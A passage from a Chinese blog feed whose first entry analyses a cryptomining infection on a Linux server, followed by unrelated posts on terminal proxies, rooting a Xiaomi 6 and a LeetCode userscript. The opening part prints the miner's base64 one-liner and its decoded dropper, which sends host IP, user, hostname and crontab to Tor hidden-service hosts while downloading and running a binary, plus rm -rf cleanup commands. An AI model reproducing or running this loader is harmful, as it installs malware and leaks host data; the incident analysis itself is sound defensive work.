KeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQgb25pb24uZm91bmRhdGlvbiBvbmlvbi5jb20uZGUgb25pb24uc2ggdG9yMndlYi5zdSAKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash</span><br></pre></td></tr></table></figure><p>解码之后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV</span><br><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line"></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)</span><br><span class="line">c=$(echo &quot;curl -4fsSLkA- -m200&quot;)</span><br><span class="line">t=$(echo &quot;wvzyv2nptjuxcqoibeklxese46j4uonzaapwyl6wvhdknjlqlcoeu7id&quot;)</span><br><span class="line"></span><br><span class="line">sockz() &#123;</span><br><span class="line">n=(doh.defaultroutes.de dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)</span><br><span class="line">p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)</span><br><span class="line">s=$($c https://$&#123;n[$((RANDOM%10))]&#125;/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &apos; &apos; &apos;\n&apos;|grep -Ev [.]0|sort -uR|head -n 1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fexe() &#123;</span><br><span class="line">for i in . $HOME /usr/bin $d /var/tmp ;do echo exit &gt; $i/i &amp;&amp; chmod +x $i/i &amp;&amp; cd $i &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; break;done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u() &#123;</span><br><span class="line">sockz</span><br><span class="line">f=/int.$(uname -m)</span><br><span class="line">x=./$(date|md5sum|cut -f1 -d-)</span><br><span class="line">r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep &apos;inet &apos;|awk &#123;&apos;print $2&apos;&#125;|md5sum|awk &#123;&apos;print $1&apos;&#125;)_$(crontab -l|base64 -w0)</span><br><span class="line">$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r</span><br><span class="line">chmod +x $x;$x;rm -f $x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for h in tor2web.in tor2web.it onion.foundation onion.com.de onion.sh tor2web.su </span><br><span class="line">do</span><br><span class="line">if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then</span><br><span class="line">fexe;u $t.$h</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)</span><br><span class="line">else</span><br><span class="line">break</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>好家伙，不看不知道，一看下一跳，跟之前那个文件一模一样，吓得我又不由自主的说了一句，好家伙</p><p>这里补充一点分析：之前我们只是用<code>crontab -l</code>，查看了定时任务，并没有找到定时任务的配置文件，而经验告诉我们，<code>crontab</code>的配置文件，通常在<code>/etc/cron.d/</code>下，还有，如果是<code>root</code>用户，在<code>/var/spool/cron/crontabs/root</code>文件中，于是我们分别执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -la /etc/cron.d/</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure><p><img src="/posts/e2d5f670/2021-03-28-22-21-48.png" alt></p><p>果然，看到了熟悉的<code>0systemd-service</code></p><p>我们来看一下，它的内容，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/cron.d/0systemd-service</span><br></pre></td></tr></table></figure><p><img src="/posts/e2d5f670/2021-03-28-22-23-48.png" alt></p><p>可以清晰的看到，它在定时的启动挖矿程序</p><p>好了，分析真的就到这里为止了，下面是解决木马篇</p><h3 id="彻底干掉木马"><a href="#彻底干掉木马" class="headerlink" title="彻底干掉木马"></a>彻底干掉木马</h3><p>分析了一大堆，最关键的文件是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/cron.d/0systemd-service</span><br><span class="line">/var/spool/cron/crontabs/root</span><br><span class="line">/opt/systemd-service.sh</span><br><span class="line">/root/.systemd-service.sh</span><br></pre></td></tr></table></figure><p>删掉这几个文件，然后停掉挖矿进程即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/.X11-unix/01 |xargs kill -9 &amp;&amp; cat /tmp/.X11-unix/11 |xargs kill -9 &amp;&amp; rm -rf /etc/cron.d/0systemd-service &amp;&amp; rm -rf /opt/systemd-service.sh &amp;&amp; rm -rf /root/.systemd-service.sh &amp;&amp; rm -rf /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure><p>重启，验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot now</span><br></pre></td></tr></table></figure><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>根据经验，我们可以知道，挖矿木马，通常还会修改我们的<code>know_hosts</code>文件和<code>hosts</code>文件，所以我们去验证一下，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .ssh/known_hosts</span><br></pre></td></tr></table></figure><p><img src="/posts/e2d5f670/2021-03-28-22-38-06.png" alt></p><p>可以看到，果然写了一个公钥到<code>know_hosts</code>文件</p><p>可以执行，<code>echo &gt; .ssh/known_hosts</code>，修复它</p><p>我们在看一下<code>hosts</code>文件，执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure><p><img src="/posts/e2d5f670/2021-03-28-22-40-31.png" alt></p><p>看起来并没有修改</p><p>当然，也可以利用木马的特征，故意的制造一些混淆文件，防止再次感染，当然，也不是绝对有效的，安全与反安全，从来就没有高低之分，有的只是技术人员的能力差别而已</p><p>附上防止再次感染的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /etc/cron.d/0systemd-service &amp;&amp; chmod 000 /etc/cron.d/0systemd-service &amp;&amp; chattr -i /etc/cron.d/0systemd-service &amp;&amp;</span><br><span class="line">mkdir /opt/systemd-service.sh &amp;&amp; chmod 000 /opt/systemd-service.sh &amp;&amp; chattr -i /opt/systemd-service.sh &amp;&amp;</span><br><span class="line">mkdir /root/.systemd-service.sh &amp;&amp; chmod 000 /root/.systemd-service.sh &amp;&amp; chattr -i /root/.systemd-service.sh &amp;&amp; </span><br><span class="line">mkdir /var/spool/cron/crontabs/root &amp;&amp; chmod 000 /var/spool/cron/crontabs/root &amp;&amp; chattr -i /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure><p>总结：解决挖矿木马，并防止感染，只需要两步：</p><ol><li> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/.X11-unix/01 |xargs kill -9 &amp;&amp; cat /tmp/.X11-unix/11 |xargs kill -9 &amp;&amp; rm -rf /etc/cron.d/0systemd-service &amp;&amp; rm -rf /opt/systemd-service.sh &amp;&amp; rm -rf /root/.systemd-service.sh &amp;&amp; rm -rf /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure></li><li> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /etc/cron.d/0systemd-service &amp;&amp; chmod 000 /etc/cron.d/0systemd-service &amp;&amp; chattr -i /etc/cron.d/0systemd-service &amp;&amp;</span><br><span class="line">mkdir /opt/systemd-service.sh &amp;&amp; chmod 000 /opt/systemd-service.sh &amp;&amp; chattr -i /opt/systemd-service.sh &amp;&amp;</span><br><span class="line">mkdir /root/.systemd-service.sh &amp;&amp; chmod 000 /root/.systemd-service.sh &amp;&amp; chattr -i /root/.systemd-service.sh &amp;&amp; </span><br><span class="line">mkdir /var/spool/cron/crontabs/root &amp;&amp; chmod 000 /var/spool/cron/crontabs/root &amp;&amp; chattr -i /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure></li></ol><p>本文完。。。看到这里，也说明你很有毅力和探索欲，如果觉得我写的还不错，请打赏支持我，毕竟创作不易，谢谢大家</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;最近师兄找到我，说他的服务器似乎被挂了挖矿木马，cpu占用率居高不下，网站（个人博客）也看起来像是被挂马了，这篇博客打算详细记录一下这次和挖
      
    
    </summary>
    
      <category term="linux" scheme="https://blog.zimo.wiki/categories/linux/"/>
    
      <category term="ubantu" scheme="https://blog.zimo.wiki/categories/linux/ubantu/"/>
    
    
      <category term="linux" scheme="https://blog.zimo.wiki/tags/linux/"/>
    
      <category term="挖矿木马" scheme="https://blog.zimo.wiki/tags/%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC/"/>
    
      <category term="服务器" scheme="https://blog.zimo.wiki/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
      <category term="运维" scheme="https://blog.zimo.wiki/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>终端使用代理</title>
    <link href="https://blog.zimo.wiki/posts/39ffeca3/"/>
    <id>https://blog.zimo.wiki/posts/39ffeca3/</id>
    <published>2021-03-27T14:42:39.000Z</published>
    <updated>2022-05-04T02:56:01.466Z</updated>
    
    <content type="html"><![CDATA[<h2 id="临时"><a href="#临时" class="headerlink" title="临时"></a>临时</h2><p>windows终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set all_proxy=socks5://host:port</span><br></pre></td></tr></table></figure><p>linux终端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export all_proxy=socks5://host:port</span><br></pre></td></tr></table></figure><h2 id="永久"><a href="#永久" class="headerlink" title="永久"></a>永久</h2><p>写入配置文件中即可</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;临时&quot;&gt;&lt;a href=&quot;#临时&quot; class=&quot;headerlink&quot; title=&quot;临时&quot;&gt;&lt;/a&gt;临时&lt;/h2&gt;&lt;p&gt;windows终端&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gu
      
    
    </summary>
    
      <category term="爬虫" scheme="https://blog.zimo.wiki/categories/%E7%88%AC%E8%99%AB/"/>
    
      <category term="代理" scheme="https://blog.zimo.wiki/categories/%E7%88%AC%E8%99%AB/%E4%BB%A3%E7%90%86/"/>
    
    
      <category term="终端" scheme="https://blog.zimo.wiki/tags/%E7%BB%88%E7%AB%AF/"/>
    
      <category term="代理" scheme="https://blog.zimo.wiki/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>小米6钉子户折腾日记（一）</title>
    <link href="https://blog.zimo.wiki/posts/574b2b2e/"/>
    <id>https://blog.zimo.wiki/posts/574b2b2e/</id>
    <published>2021-01-27T07:17:36.000Z</published>
    <updated>2022-05-04T02:56:01.398Z</updated>
    
    <content type="html"><![CDATA[<p><strong>篇一：初级折腾</strong></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>先谈一谈我和小米的缘分吧，自从14年，我购入了属于我自己的第一台小米手机——小米note之后，就一直在用小米系列的手机产品，我用过的产品线大概是这样的小米note-&gt;小米5-&gt;小米max-&gt;小米6-&gt;小米CC9（目前），至于我为什么要买小米系的产品，我认为原因有两点吧，第一，miui确实大而全并且好玩，发烧友们应该都懂；第二，我应该算是雷军的粉丝吧，国内科技圈我最为崇拜的两个人，雷军和求伯君</p></blockquote><blockquote><p>再谈一谈，我手里这台小米6吧，17年首发提前批F码通道到手的，说实话，我自己也没想到，它坚持到了现在，并且目前还保持着较高的流畅度，因为一直保护的还算比较好，成色比较新（至少85新吧，仅不锈钢中框掉了一点点漆），截止到目前为止，没有换过手机的任何零部件，我都用它干过些什么呢？老实说，在它作为我的主力机的时候，我并没有对它进行任何的折腾，就纯粹的正常使用，我对它的折腾开始于，它作为备用机的时候，作为一个发烧友（可能不太合格） <strong>折腾</strong> 当然包括但不限于解锁，刷机，root，recovery，magisk，xposed，魔改官方ROM，魔改官方apk等操作</p></blockquote><blockquote><p>实际上，就我个人而言，折腾应该算作是我的兴趣爱好吧，生命在于折腾</p></blockquote><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>主要回答下面这几个问题：</p><h3 id="这个系列的文章仅适用于小米6钉子户吗？"><a href="#这个系列的文章仅适用于小米6钉子户吗？" class="headerlink" title="这个系列的文章仅适用于小米6钉子户吗？"></a>这个系列的文章仅适用于小米6钉子户吗？</h3><p>答：我在这个系列的文章中仅会以小米6手机举例：包括所有实例，步骤等。但是折腾这东西吧，思路其实是适用于很多方面，只要你有一颗想做极客的心，我认为都可以从这个系列的文章中学到一些东西</p><h3 id="这篇文章的内容包括哪些？"><a href="#这篇文章的内容包括哪些？" class="headerlink" title="这篇文章的内容包括哪些？"></a>这篇文章的内容包括哪些？</h3><p>答：大概有：</p><ol><li>解锁bl</li><li>刷第三方recovery</li><li>刷入root</li><li>刷入magisk</li><li>刷入xposed</li><li>初级救砖</li></ol><h3 id="为什么这篇文章是初级篇？"><a href="#为什么这篇文章是初级篇？" class="headerlink" title="为什么这篇文章是初级篇？"></a>为什么这篇文章是初级篇？</h3><p>答：因为我认为以上所列出的所有操作，均是初级操作，换言之，就是大部分人都会的东西（毕竟各路教程满天飞），没什么好稀奇的，也谈不上很牛的技术，如果非要说牛的话，我认为，造轮子的大佬们牛，努力吧，也许这辈子都无法到达那个高度，但至少我们曾经为此努力过，不是吗？</p><h3 id="后面会有高级篇吗？"><a href="#后面会有高级篇吗？" class="headerlink" title="后面会有高级篇吗？"></a>后面会有高级篇吗？</h3><p>答：这是系列文章，后面自然会出高级篇（提前给自己挖坑。不知道啥时候埋）</p><h3 id="高级篇的内容包括哪些？"><a href="#高级篇的内容包括哪些？" class="headerlink" title="高级篇的内容包括哪些？"></a>高级篇的内容包括哪些？</h3><p>答：大概有</p><ol><li>反编译，魔改系统apk</li><li>魔改ROM</li><li>移植ROM</li><li>高级救砖</li><li>各种自定义</li></ol><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p><strong>请严格按照目录依次操作</strong></p><h3 id="解锁bl"><a href="#解锁bl" class="headerlink" title="解锁bl"></a>解锁bl</h3><p>就参考官方吧，很多时候官方的东西，会给我们很多的灵感，遇到问题的时候，多翻一翻官方的东西，也许有意外惊喜，至于解锁教程，官方的教程已经足够详细，不再多说，如果实在不会，请访问<a href="http://www.miui.com/unlock/index.html" target="_blank" rel="noopener">官方教程</a></p><h3 id="刷第三方recovery"><a href="#刷第三方recovery" class="headerlink" title="刷第三方recovery"></a>刷第三方recovery</h3><p>提到第三方recovery就不得不提<a href="https://twrp.me/" target="_blank" rel="noopener">twrp</a>，虽然我最后使用的第三方recovery不是twrp，而是<a href="https://orangefox.download/zh-CN" target="_blank" rel="noopener">OrangeFox</a>，但是刷入OrangeFox前，需要先刷入其他的第三方recovery，于是还是得刷twrp</p><p>需要准备的工具：</p><ol><li>adb</li><li>fastboot</li><li>一条数据线</li></ol><p>如果你电脑上有Android Sdk，你会发现这些都是集成好的，为了方便使用，你需要做的大概只有把那个目录加入到环境变量中<br><img src="/posts/574b2b2e/2021-01-29-14-00-49.png" alt></p><p>需要准备的文件：</p><p><a href="https://twrp.me/xiaomi/xiaomimi6.html" target="_blank" rel="noopener">twrp-3.5.0_9-0-sagit.img</a><br><a href="https://orangefox.download/zh-CN/device/sagit" target="_blank" rel="noopener">OrangeFox-sagit-stable@R10.0.zip</a></p><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol><li>手机设置中打开开发者选项，打开USB调试和USB调试安全选项，如果你手机没有开发者选项这个设置，快速连续点击设置-&gt;我的设备-&gt;全部参数-&gt;miui版本十次<br><img src="/posts/574b2b2e/2021-01-29-14-23-15.png" alt></li><li>手机开机状态下，数据线连上电脑，执行命令<code>adb reboot bootloader</code>或者手机关机状态下，同时按住开机键和音量上键，进入fastboot，看到米兔正在修理机器人界面</li><li>在你下载好的文件目录下，打开cmd，执行命令，<code>fastboot flash recovery twrp-3.5.0_9-0-sagit.img</code><br><img src="/posts/574b2b2e/2021-01-29-14-29-14.png" alt></li><li>刷完之后，不要直接开机，不然会自动恢复官方的recovery，保持关机状态下，同时按住开机键和音量上键，应该会进入twrp的recovery</li><li>如果你有密码，进入recovery后会要求输入密码，验证通过后这时候adb会自动连接上，把OrangeFox的zip复制到手机上，然后使用twrp的install功能，安装zip<br><img src="/posts/574b2b2e/2021-01-29-14-37-01.png" alt></li><li>完成后重启，第三方recovery就刷好了</li><li>one the more，如果你不喜欢英文，可以在设置中切换为中文</li></ol><p>这里稍微提一下为啥要使用OrangeFox的recovery，因为这家的recovery对miui官方包的支持可能是最好的吧，它支持官方包的ota等，我个人比较喜欢官方包，在官方包的基础上魔改一些东西，自定义</p><h3 id="刷入root"><a href="#刷入root" class="headerlink" title="刷入root"></a>刷入root</h3><p>这个相当的简单了，如果你喜欢官方给你的root，你可以选择刷入miui官方的开发版系统自带的root包，这个过程可以自动完成，只需要在手机管家-&gt;应用管理-&gt;权限-&gt;开启root权限即可，如果你不喜欢官方给你的，刷入magisk是另一种选择</p><h3 id="刷入magisk"><a href="#刷入magisk" class="headerlink" title="刷入magisk"></a>刷入magisk</h3><p>直接下载最新的<a href="https://github.com/topjohnwu/Magisk/tags" target="_blank" rel="noopener">Magisk.zip</a>，然后放入手机根目录，重启到recovery，安装即可</p><h3 id="刷入xposed"><a href="#刷入xposed" class="headerlink" title="刷入xposed"></a>刷入xposed</h3><p>官方的<a href="https://github.com/rovo89/XposedInstaller" target="_blank" rel="noopener">xposed</a>最高只支持到android 8，如果你是8及其以下，可以选择官方的，不是的话，就选择<a href="https://github.com/ElderDrivers/EdXposed" target="_blank" rel="noopener">Edxposed</a>吧</p><p>需要准备的文件：</p><p><img src="/posts/574b2b2e/2021-01-29-14-53-55.png" alt></p><h4 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h4><ol><li>进入recovery，刷入magisk</li><li>开机，在magisk manager应用中安装Riru模块，可能需要一个梯子<br><img src="/posts/574b2b2e/2021-01-29-15-00-22.png" alt></li><li>进入recovery，刷入Edxposed</li><li>开机，安装Edxposed Manager</li><li>enjoy it!!!<br><img src="/posts/574b2b2e/2021-01-29-15-09-22.png" alt></li></ol><h3 id="初级救砖"><a href="#初级救砖" class="headerlink" title="初级救砖"></a>初级救砖</h3><p>其实就是卡刷和线刷救砖，预备好官方包，在无限重启 无法开机等异常状态时，重新刷入官方包，使之回归到正常状态，不再过多赘述</p><p>我预备了这四个包，既有卡刷包，也有线刷包<br><img src="/posts/574b2b2e/2021-01-29-15-13-55.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>初级篇所有过程均不复杂，毕竟工具确实好用，按步骤来基本不会出问题</p><p>题外话，不建议使用未知来源或者不开源的magisk或者xposed模块，so dangerous</p><p>其实这篇文章里面所有内容，均有人做好了相关的ROM了甚至他们给的功能增强更强，而安装基本也就是一键操作，很方便，那为什么我不直接使用他们做好的呢？答案其实很显然：推广太多并且极度危险，另外 我喜欢自己魔改，包括在写这篇文章中所安装好magisk和xposed，它们很好玩，很强，但其实我不需要他们，为什么呢？因为他们给的太多了，而我需要的并没有这么多，由此将会引出高级篇，各种自定义修改，魔改系统等等</p><p>只有你自己才知道你需要的到底是什么，但好多时候 其实连你自己都不知道</p><p>敬请期待高级篇</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;篇一：初级折腾&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;先谈一谈我和小米的缘分吧，自从14年，我购入了属于
      
    
    </summary>
    
      <category term="发烧友折腾日记" scheme="https://blog.zimo.wiki/categories/%E5%8F%91%E7%83%A7%E5%8F%8B%E6%8A%98%E8%85%BE%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="小米6" scheme="https://blog.zimo.wiki/tags/%E5%B0%8F%E7%B1%B36/"/>
    
      <category term="钉子户" scheme="https://blog.zimo.wiki/tags/%E9%92%89%E5%AD%90%E6%88%B7/"/>
    
      <category term="折腾" scheme="https://blog.zimo.wiki/tags/%E6%8A%98%E8%85%BE/"/>
    
      <category term="解锁bl" scheme="https://blog.zimo.wiki/tags/%E8%A7%A3%E9%94%81bl/"/>
    
      <category term="刷recovery" scheme="https://blog.zimo.wiki/tags/%E5%88%B7recovery/"/>
    
      <category term="极客" scheme="https://blog.zimo.wiki/tags/%E6%9E%81%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>基于油猴的力扣题目转换工具 html转markdown 便于写题解</title>
    <link href="https://blog.zimo.wiki/posts/f027b6b4/"/>
    <id>https://blog.zimo.wiki/posts/f027b6b4/</id>
    <published>2021-01-02T13:24:45.000Z</published>
    <updated>2022-05-04T02:56:01.394Z</updated>
    
    <content type="html"><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>刷力扣的时候，写题解是好习惯，但是每次复制题目，都需要手动修改成markdown格式的，挺麻烦的，于是借助油猴脚本插件，写了这个力扣题目转换工具，功能是将html格式的题目，转换成markdown格式的题目，一键复制粘贴即可很愉快的去写题解了</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol><li>首先在浏览器安装油猴插件</li><li>然后从 <a href="https://gitee.com/zimolove3/leetcode-helper/raw/main/leetcode-helper.user.js" target="_blank" rel="noopener">https://gitee.com/zimolove3/leetcode-helper/raw/main/leetcode-helper.user.js</a> 导入油猴脚本</li><li>打开力扣题目，你会发现加载了脚本，选择图中所示复制题目到剪切板即可<br><img src="/posts/f027b6b4/2021-01-02-21-42-25.png" alt><br><img src="/posts/f027b6b4/2021-01-02-21-44-17.png" alt></li><li>复制成功<br><img src="/posts/f027b6b4/2021-01-02-21-45-06.png" alt></li></ol><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>开源地址：<a href="https://github.com/ZimoLoveShuang/leetcode-helper" target="_blank" rel="noopener">https://github.com/ZimoLoveShuang/leetcode-helper</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;描述&quot;&gt;&lt;a href=&quot;#描述&quot; class=&quot;headerlink&quot; title=&quot;描述&quot;&gt;&lt;/a&gt;描述&lt;/h2&gt;&lt;p&gt;刷力扣的时候，写题解是好习惯，但是每次复制题目，都需要手动修改成markdown格式的，挺麻烦的，于是借助油猴脚本插件，写了这个力扣题目转换
      
    
    </summary>
    
      <category term="随笔" scheme="https://blog.zimo.wiki/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="油猴脚本" scheme="https://blog.zimo.wiki/tags/%E6%B2%B9%E7%8C%B4%E8%84%9A%E6%9C%AC/"/>
    
      <category term="力扣" scheme="https://blog.zimo.wiki/tags/%E5%8A%9B%E6%89%A3/"/>
    
      <category term="html" scheme="https://blog.zimo.wiki/tags/html/"/>
    
      <category term="markdown" scheme="https://blog.zimo.wiki/tags/markdown/"/>
    
      <category term="JavaScript" scheme="https://blog.zimo.wiki/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>一种导入小爱课程表的非一般方法</title>
    <link href="https://blog.zimo.wiki/posts/bf2ec5ab/"/>
    <id>https://blog.zimo.wiki/posts/bf2ec5ab/</id>
    <published>2020-11-02T08:15:41.000Z</published>
    <updated>2022-05-04T02:56:01.382Z</updated>
    
